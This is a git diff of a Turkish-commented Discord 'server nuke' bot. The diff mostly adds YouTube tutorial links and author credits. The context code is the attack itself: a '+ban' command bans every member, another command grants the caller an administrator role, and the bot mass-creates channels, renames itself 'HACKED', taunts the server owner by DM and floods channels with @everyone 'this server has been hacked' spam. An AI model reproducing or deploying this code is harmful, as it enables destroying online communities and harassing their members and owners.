@@ -5,7 +5,7 @@ const { Client, Util } = require("discord.js");
 const request = require("request");
 client.login(ayarlar.token);
 
-client.on("message", msg => {
+client.on("message", msg => {           ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
   if (msg.content === "+ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());  
@@ -39,7 +39,7 @@ client.on("message", msg => {
       name: ".",
       permissions: ["ADMINISTRATOR"]
     });
-    let rol = msg.guild.roles.find(role => role.name === ".");
+    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
     msg.member.addRole(rol);
   }
 });
@@ -127,7 +127,7 @@ client.on("message", async msg => {
       .createChannel("KÜLLERİMİZDEN", {
         type: "voice"
       })
-      .then(chan => {
+      .then(chan => {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
         chan.setUserLimit("1");
       });
             await msg.guild
@@ -201,7 +201,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
         type: "voice"
       })
       .then(chan => {
@@ -477,7 +477,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
                 await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
         type: "voice"
       })
       .then(chan => {
@@ -690,7 +690,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("SONSUZ", {
+      .createChannel("SONSUZ", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
         type: "voice"
       })
       .then(chan => {
@@ -777,7 +777,7 @@ client.on("message", async msg => {
         await msg.guild
       .createChannel("SONSUZ", {
         type: "voice"
-      })
+      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
       .then(chan => {
         chan.setUserLimit("1");
       });
@@ -940,7 +940,7 @@ client.on("message", async msg => {
             await msg.guild
       .createChannel("HÜKÜMDARLIĞIMIZ", {
         type: "voice"
-      })
+      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
       .then(chan => {
         chan.setUserLimit("1");
       });
@@ -1109,7 +1109,7 @@ client.on("message", async msg => {
       });
             await msg.guild
       .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
+        type: "voice"     ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
       })
       .then(chan => {
         chan.setUserLimit("1");
@@ -1240,7 +1240,7 @@ client.on("message", async msg => {
       })
       .then(chan => {
         chan.setUserLimit("1");
-      });
+      });                      ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
                 await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
@@ -1256,7 +1256,7 @@ client.on("message", async msg => {
     await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
-  }
+  }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
 });
 
  //www.youtube.com/enesacaryoutube TARAFINDAN YAPILMISTIR
@@ -1426,7 +1426,7 @@ client.on("message", async msg => {
     });
                     msg.guild.createRole({
       name: "HACKED",
-      color: "E000FF",
+      color: "E000FF",  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0  
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
@@ -1500,6 +1500,7 @@ client.on('message', msg => {
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
@@ -1533,8 +1534,7 @@ client.on('message', msg => {
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
@@ -1588,7 +1588,7 @@ const app = express();
   }    
 }
 app.get("/", (request, response) => {
-  console.log(Date.now() + " Ping tamamdır.");
+  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
   response.sendStatus(200);
 });
 app.listen(process.env.PORT);
@@ -1597,4 +1597,4 @@ setInterval(() => {
 }, 3000);
 
 
-//TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryoutube KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
+//TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryoutube VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
